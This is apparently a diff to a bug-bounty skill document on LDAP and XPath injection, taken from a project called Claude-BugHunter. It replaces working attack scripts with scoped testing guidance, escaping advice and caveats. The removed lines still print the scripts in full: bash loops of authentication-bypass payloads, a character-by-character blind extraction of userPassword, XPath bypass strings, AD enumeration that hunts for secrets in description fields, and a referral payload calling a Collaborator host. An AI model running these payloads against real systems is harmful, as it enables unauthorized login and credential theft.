@@ -108,8 +108,7 @@ filter-syntax error instead of executing.
 ### The special-character set — TEST EACH ONE
 
 These characters are syntactically meaningful and MUST be escaped by a safe app
-(RFC 4515 §3). If the app reflects an error or behaves differently when you send
-them raw, the input is unescaped → injectable:
+(RFC 4515 §3). A different response can suggest parser involvement but does not prove unescaped input or exploitability:
 
 | Char | Filter escape | Why it matters |
 |------|---------------|----------------|
@@ -118,13 +117,13 @@ them raw, the input is unescaped → injectable:
 | `)`  | `\29` | closes a filter group |
 | `\`  | `\5c` | escape char itself |
 | NUL  | `\00` | string terminator — truncates filter in C-backed servers |
-| `/`  | (DN context) | RDN separator — relevant for DN injection |
+| `,` | DN-context escaping | RDN separator; DN encoding differs from filter encoding |
 
 **Search-filter context vs DN injection** are different bugs:
 - **Search-filter injection** (most common): your input lands inside a
   `(attr=VALUE)` filter. Payloads use `* ( ) & | !`.
 - **DN injection**: your input is concatenated into a Distinguished Name
-  (`uid=VALUE,ou=people,dc=corp`). Here `,` `=` `+` `"` `\` `<` `>` `;` and `/`
+  (`uid=VALUE,ou=people,dc=corp`). Here `,` `=` `+` `"` `\` `<` `>` `;` and leading/trailing spaces
   matter, and a `*` is NOT a wildcard. Test both — the payloads do not transfer.
 
 ---
@@ -152,137 +151,44 @@ curl -s -X POST https://$TARGET/api/login \
 A lone `)` that produces a syntax error/500 while a balanced payload does not is
 the cleanest LDAP-injection tell — note it, you will need it as proof.
 
-### Phase 2 — Auth-bypass payloads (balance your parentheses)
+### Phase 2 — Derive a controlled test from the actual expression
 
-```bash
-# Target filter assumed: (&(uid=USERNAME)(userPassword=PASSWORD))
-# Goal: make the uid sub-filter always-true and neutralise the password clause.
+Do not copy a universal login payload. Record the full resulting filter, its
+parentheses and the actual bind/search flow; LDAP filters have no SQL-style
+comment syntax. A filter selecting a user does not itself authenticate a password.
+In a local fixture where the complete predicate is `(uid=INPUT)`, `*` changes the
+expression to `(uid=*)` and tests presence rather than a literal star. Compare
+that with the correctly escaped literal `(uid=\2a)` and a nonexistent synthetic
+UID. In a real nested AND filter, those results do not establish password bypass.
 
-# Wildcard-everything (works when password clause is dropped by a trailing comment-like break):
-#   username = *)(uid=*))(|(uid=*    password = anything
-# Always-true admin (OR uid=*):
-#   username = admin)(|(uid=*)       (note: leaves one extra ')' — see below)
-# NUL-truncate the password clause (C-backed servers):
-#   username = admin)(uid=*))%00      password = x
+Use paired true/false controls on a public synthetic attribute and controlled
+accounts, not a production credential value. Bound the requests, rate and runtime;
+stop on lockout, elevated errors or unexpected personal data. Never expand to
+password spraying, hash cracking or real attribute extraction without separately
+scoped authorization and the exact command gate above.
 
-USERNAME_PAYLOADS=(
-  'admin))(|(uid=*'        # close uid + close &, open OR uid=* — balance check below
-  '*)(uid=*))(|(uid=*'     # full always-true, self-balancing classic
-  'admin)(!(userPassword=ZZZ))'  # AND NOT a password that is never set → always true
-  'admin*'                 # simple wildcard suffix — try first, lowest noise
-)
+### Phase 3 — XPath and evidence
 
-for P in "${USERNAME_PAYLOADS[@]}"; do
-  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
-    -H "Content-Type: application/json" \
-    -d "{\"username\":$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$P"),\"password\":\"anything\"}")
-  echo "PAYLOAD: $P"
-  echo "RESP:    ${R: -40}"
-  echo "BASE:    $BASE   <-- compare http_code+size to rule out false positive"
-  echo "---"
-done
-```
+For a known XPath 1.0 expression using a quoted string, a quote may alter syntax;
+construct the entire predicate and verify precedence, quoting and selected nodes
+in a disposable local XML fixture. Prefer variable binding in the application's
+XPath API to concatenation. Error messages or response length alone do not prove
+successful authentication or data access. Use a controlled test session and a
+post-login resource only within scope; do not print cookies or account records.
 
-**Parenthesis-balancing rule of thumb:** count `(` minus `)` in the *resulting*
-full filter, not just your payload. If the app appends `)(userPassword=...))`
-after your input, leave the right number of trailing `)` so the final string is
-balanced. An unbalanced filter = syntax error = NOT a bypass (false positive).
+### Phase 4 — Direct LDAP confirmation and remediation
 
-### Phase 3 — Blind exfil with a CONTROLLED oracle (not raw byte-count)
+If direct directory access is authorized, use certificate-verified LDAPS or
+required StartTLS and prompt-based credentials (`ldapsearch -W`) rather than a
+password in command arguments. Restrict requested attributes and search base.
+Use the library's distinct filter-value and DN escaping APIs, least-privilege
+bind accounts and proper bind authentication; reject empty passwords where the
+application requires authentication. A referral-like filter attribute is not a
+standard instruction to follow a URL. OOB callbacks require correlation and
+controls and cannot automatically prove LDAP injection or exclude scanner noise.
 
-Raw `size_download` diffing is noise-prone (WAF banners, CSRF tokens, timestamps,
-length-jitter on the injected char itself). Use a **paired true/false control**
-so the oracle is the *response*, not the absolute size.
-
-```bash
-# Oracle pair: a known-TRUE filter and a known-FALSE filter on a public attr.
-# TRUE : admin)(uid=*))(|(uid=*     -> entry exists
-# FALSE: admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ
-probe () {  # $1 = filter-tail payload -> prints normalized size
-  curl -s -o /dev/null -w "%{size_download}" -X POST https://$TARGET/api/login \
-    -H "Content-Type: application/json" \
-    -d "{\"username\":\"$1\",\"password\":\"x\"}"
-}
-T=$(probe 'admin)(uid=*))(|(uid=*')
-F=$(probe 'admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ')
-echo "TRUE-class size=$T  FALSE-class size=$F"
-[ "$T" = "$F" ] && { echo "No length oracle — try a STATUS or BODY-MARKER oracle, or OOB."; exit; }
-
-# Now extract char-by-char. The boolean test compares against $T/$F, NOT a guess.
-# Filter: (&(uid=admin)(userPassword=<PREFIX><CHAR>*))  on a NON-AD directory.
-PREFIX=""
-for pos in $(seq 1 32); do
-  for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do
-    S=$(probe "admin)(userPassword=${PREFIX}${C}*))(|(uid=*")
-    if [ "$S" = "$T" ]; then PREFIX="${PREFIX}${C}"; echo "[$pos] -> $PREFIX"; break; fi
-  done
-done
-echo "RECOVERED: $PREFIX"
-```
-
-False-positive guards for blind exfil:
-- **Repeat each positive char 3x** and confirm the size is stable — length-jitter
-  from the attacker-controlled char itself is the #1 false positive.
-- Confirm the **FALSE control still returns the FALSE size** after each round (the
-  app didn't just start erroring on every request — WAF block looks like a match).
-- If body length is unreliable, switch the oracle to **HTTP status**, a **body
-  marker string** (`"Invalid credentials"` present/absent), or **timing** with a
-  heavy filter — but only after establishing a stable baseline delta.
-
-### Phase 4 — XPath injection (XML-backed auth)
-
-```bash
-# Normal: //users/user[name/text()='ADMIN' and password/text()='PASS']
-# Bypass closes the name predicate and OR-trues the whole expression.
-XPATH_PAYLOADS=(
-  "' or '1'='1"
-  "' or ''='"
-  "admin' or '1'='1' or 'a'='b"     # keeps quoting balanced
-  "x'] | //user/* | //user[name()='x"  # blind: dump all user nodes (XPath has no comments)
-  "*[contains(name(),'pass')]"          # node-name discovery
-)
-for P in "${XPATH_PAYLOADS[@]}"; do
-  E=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$P")
-  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
-    --data-urlencode "username=$P" --data-urlencode "password=x")
-  echo "$P  ->  ${R: -24}"
-done
-# XPath has NO comment syntax — you must keep quotes/brackets balanced, unlike SQLi.
-```
-
-### Phase 5 — AD enumeration via wildcard (count oracle, with control)
-
-```bash
-# Establish that prefix='zzqx' (unlikely) returns ~0 and prefix='a' returns more.
-# A directory that returns the SAME count for both is NOT leaking via wildcard.
-count () { curl -s -X POST https://$TARGET/api/directory/search \
-  -H "Content-Type: application/json" -d "{\"filter\":\"(sAMAccountName=$1*)\"}" \
-  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("results",d.get("users",[]))))' 2>/dev/null; }
-CTRL=$(count "zzqx_unlikely")
-echo "control count (should be ~0): $CTRL"
-for L in {a..z}; do echo "$L* -> $(count $L)  (vs control $CTRL)"; done
-# Then pivot to memberOf / description for privileged accounts:
-#   (&(sAMAccountName=*)(memberOf=*Domain Admins*))
-#   (description=*pw*)   (description=*pass*)   — admins stash secrets here
-```
-
-### Phase 6 — Tooling & OOB confirmation
-
-```bash
-# Validate the inferred filter directly if you ever get LDAP creds / a bind:
-ldapsearch -x -H ldap://$AD_HOST -D "CORP\\user" -w "$PW" \
-  -b "dc=corp,dc=local" "(&(objectClass=user)(sAMAccountName=admin*))" sAMAccountName memberOf
-
-# Burp: Intruder over the char set for blind exfil; the Web Security Academy
-# "Blind LDAP injection" labs mirror the Phase-3 oracle exactly.
-# OOB (rare but decisive): some JNDI/LDAP stacks resolve a referral. If you can
-# inject a referral/URL the server dereferences, point it at Collaborator:
-#   (uid=*))(referral=ldap://<COLLAB>/x)   — a DNS/LDAP hit at Collaborator
-# is server-side proof with zero ambiguity. Treat any Collaborator interaction
-# as the gold-standard confirmation for otherwise-blind cases.
-```
-
----
+Primary references: [RFC 4515](https://www.rfc-editor.org/rfc/rfc4515),
+[OWASP prevention](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html).
 
 ## Chain Table
 
@@ -319,8 +225,7 @@ WAF-block, and length-jitter explanations.
       a direct lookup or by the auth-bypass payload that uses it.
 - [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged
       in to a real account context — not just a different error page.
-- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral
-      payload is decisive for blind cases — prefer it over length-only inference.
+- [ ] **OOB where possible:** a correlated callback requires mechanism-specific evidence and controls; it is not decisive on its own.
 - [ ] **AD claim discipline:** if you say "AD", you enumerated AD-specific attrs
       (`sAMAccountName`/`memberOf`); never claim AD hash exfil.
 
@@ -349,3 +254,5 @@ cat scope.txt  # target list from the authorized engagement brief
 ```
 
 > Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
+
+Severity labels above are triage hypotheses, not automatic CVSS outcomes. Generic LDAP userPassword values are readable only with suitable ACLs; AD unicodePwd is not returned by ordinary search, but that does not justify a blanket claim that no AD attribute can ever contain a secret. Do not imply a PortSwigger LDAP academy/lab exists without a verified direct reference. Missing report_count evidence is not a confirmed engagement history.
